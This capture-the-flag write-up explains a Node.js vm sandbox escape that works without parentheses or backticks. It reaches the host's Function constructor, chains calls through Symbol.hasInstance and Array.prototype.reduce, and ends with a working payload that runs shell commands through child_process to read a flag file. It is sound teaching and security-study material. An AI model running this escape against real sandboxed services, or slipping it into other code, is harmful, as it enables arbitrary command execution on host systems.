# Functionless Writeup (en)

## Author

@n4o847

## Challenge Overview

- The input code is executed using the [vm](https://nodejs.org/api/vm.html) module in Node.js
- Calls to `eval` and function constructors (such as `Function`) are prohibited
- The input must not contain any of the characters `(`, `)`, or <code>`</code>

## Vulnerability

First, since `this` refers to an object created outside of the context, `this.constructor.constructor` can be used to obtain a `Function` constructor outside of the VM.

The use of this external `Function` constructor is not prohibited by the constraint `codeGeneration: { strings: false }` and allows access to global objects outside of the VM.

```js
this.constructor.constructor("console.log(process)")()
```

Next, a quick search brings up the following code as a function call that uses neither parenteses nor backticks and can also be used in Node.js:

```js
x instanceof { [Symbol.hasInstance]: f }
```

This is equivalent to:

```js
!!f.call({}, x)

// or simply
!!f(x)
```

The challenges are here:

- The function `f` can only take one argument
- The result can only be obtained as a boolean value

We would like to combine this technique with the `Fuction` constructor to successfully execute arbitrary code, but it is difficult because it requires two consecutive calls like `Function(code)()`.

As a method to obtain the result of a function call, consider using `Array.prototype.reduce` in the following way:

```js
a = [x, y, z]
a[Symbol.hasInstance] = Array.prototype.reduce
f instanceof a
```

This is equivalent to:

```js
a = [x, y, z]
!!a.reduce(f)
```

and can be expanded to:

```js
a = [x, y, z]
!!f(f(x, y, 1, a), z, 2, a)
```

Here `f` should be a function that applies one of its arguments to the other.

Trying `f = Array.from`, we get:

```js
a = [x, y, z]
!!Array.from(Array.from(x, y, 1, a), z, 2, a)
```

and if `x` is an array, this is equivalent to:

```js
!!x.map(y, 1).map(z, 2)
```

Furthermore, if `x` is an array with a single element, this is equivalent to:

```js
!!z.call(2, y.call(1, x[0], 0), 1)

// or simply
!!z(y(x[0], 0), 1)
```

If you set `y = Function`, you can get the result of `y(x[0], 0)` passed to `z`, but the second unnecessary parameter `0` is being passed as the function body.

However, you can use a default parameter in the argument part of `Function` to execute any expression you like.

```js
f = Function("x = console.log(42)", "0")
f()  // output: 42
```

Thus, the following code gives a function `f` that executes arbitrary code:

```js
a = [["x = <code>"], this.constructor.constructor, _ => f = _]
a[Symbol.hasInstance] = Array.prototype.reduce
Array.from instanceof a
```

and you can call it so that the default parameter is evaluated.

```js
+{ valueOf: f }
```

## Solution

```js
c = "process.stdout.write\x28process.mainModule.require\x28'child_process'\x29.execSync\x28'cat flag-*.txt'\x29\x29"
a = [["x = " + c], this.constructor.constructor, _ => f = _]
a[Symbol.hasInstance] = Array.prototype.reduce
Array.from instanceof a
+{ valueOf: f }
```
